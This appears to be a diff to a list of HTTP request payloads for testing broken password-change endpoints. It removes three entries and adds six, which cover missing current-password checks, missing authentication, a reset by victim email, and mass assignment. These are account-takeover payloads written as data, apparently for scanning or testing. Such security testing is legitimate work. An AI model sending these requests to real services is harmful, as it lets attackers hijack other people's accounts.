@@ -1,3 +1,6 @@
-POST /api/user/password {"new_password":"hacked"}
-POST /account/change-password {"password":"newpass"} (no current password required)
-PATCH /api/profile {"password":"evil"}
+POST /api/change-password {"new_password":"hacked"} (no current password)
+PUT /api/user/1/password {"password":"hacked"} (no auth)
+POST /api/reset {"email":"victim@example.com","new_password":"hacked"}
+PATCH /api/profile {"password":"hacked"} (mass assignment)
+POST /api/account/update {"pass":"newpass"} (no old pass check)
+PUT /api/settings {"password":"newpass","confirm":"newpass"} (no current pass)
